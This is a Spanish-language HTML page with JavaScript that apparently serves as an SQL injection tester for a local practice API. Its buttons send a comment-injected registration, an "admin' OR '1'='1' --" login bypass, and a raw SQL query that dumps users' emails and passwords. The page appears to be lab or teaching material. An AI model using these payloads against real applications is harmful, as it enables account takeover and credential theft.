<!DOCTYPE html>
<html>

<head>
    <title>Probador SQLi</title>
    <style>
        body {
            font-family: monospace;
            margin: 20px;
        }

        .endpoint {
            margin: 20px 0;
            padding: 10px;
            background: #f0f0f0;
        }

        button {
            margin: 5px;
            padding: 10px;
            cursor: pointer;
        }

        pre {
            background: #333;
            color: #0f0;
            padding: 10px;
            overflow-x: auto;
        }

        h1 {
            font-size: 40px;
            color: #0f0;
            text-align: center;
            text-shadow:  0 2px 10px #020202;
        }
    </style>
</head>

<body>
    <h1>Probador de SQL Injection</h1>

    <div class="endpoint">
        <h3>1. REGISTER - Inyección en registro</h3>
        <button onclick="testRegister()">Ejecutar Inyección en Register</button>
    </div>

    <div class="endpoint">
        <h3>2. LOGIN - Bypass de autenticación</h3>
        <button onclick="testLogin()">Ejecutar Bypass en Login</button>
    </div>

    <div class="endpoint">
        <h3>3. QUERY - Consulta SQL personalizada</h3>
        <button onclick="testQuery()">Ver todos los usuarios</button>
    </div>

    <h3>Resultado:</h3>
    <pre id="resultado">Esperando acción...</pre>

    <script>
        const API_URL = 'http://localhost:5000';

        async function testRegister() {
            const payload = {
                nombre: "hacker'--",
                gmail: "hacker@gmail.com",
                contraseña: "12345678"
            };

            document.getElementById('resultado').textContent = 'Ejecutando registro con inyección...';

            try {
                const response = await fetch(`${API_URL}/register`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await response.json();
                document.getElementById('resultado').textContent = JSON.stringify(data, null, 2);
            } catch (error) {
                document.getElementById('resultado').textContent = 'Error: ' + error.message;
            }
        }

        async function testLogin() {
            const payload = {
                nombre: "admin' OR '1'='1' --",
                contraseña: "cualquiercosa"
            };

            document.getElementById('resultado').textContent = 'Ejecutando bypass de login...';

            try {
                const response = await fetch(`${API_URL}/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await response.json();
                document.getElementById('resultado').textContent = JSON.stringify(data, null, 2);
            } catch (error) {
                document.getElementById('resultado').textContent = 'Error: ' + error.message;
            }
        }

        async function testQuery() {
            const payload = {
                sql: "SELECT id, nombre, gmail, contrasenha FROM usuario"
            };

            document.getElementById('resultado').textContent = 'Ejecutando consulta...';

            try {
                const response = await fetch(`${API_URL}/query`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await response.json();
                document.getElementById('resultado').textContent = JSON.stringify(data, null, 2);
            } catch (error) {
                document.getElementById('resultado').textContent = 'Error: ' + error.message;
            }
        }
    </script>
</body>

</html>
